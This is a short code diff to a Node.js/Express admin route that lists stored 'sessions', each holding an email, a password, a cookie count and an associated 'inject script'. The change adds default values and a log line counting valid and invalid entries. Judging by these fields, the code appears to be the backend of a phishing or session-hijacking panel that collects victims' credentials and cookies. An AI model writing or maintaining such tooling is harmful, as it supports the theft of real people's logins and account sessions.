@@ -1446,19 +1446,21 @@ app.get('/api/admin/sessions', requireAdminAuth, (req, res) => {
                     filename: file,
                     injectFilename: null, // Invalid entries don't have inject scripts
                     id: data.id,
-                    email: data.email,
+                    email: data.email || 'Unknown',
                     password: null, // Invalid entries don't have passwords
                     timestamp: data.timestamp,
                     totalCookies: 0, // Invalid entries don't have cookies
                     status: 'invalid',
-                    reason: data.reason,
-                    errorMessage: data.errorMessage
+                    reason: data.reason || 'Failed Entry',
+                    errorMessage: data.errorMessage || ''
                 };
             } catch (error) {
                 console.error(`Error reading invalid session file ${file}:`, error);
                 return null;
             }
         }).filter(session => session !== null);
+
+        console.log(`📊 Found ${validSessions.length} valid sessions and ${invalidSessions.length} invalid sessions`);
 
         // Combine and sort by timestamp (newest first)
         const allSessions = [...validSessions, ...invalidSessions].sort((a, b) => {
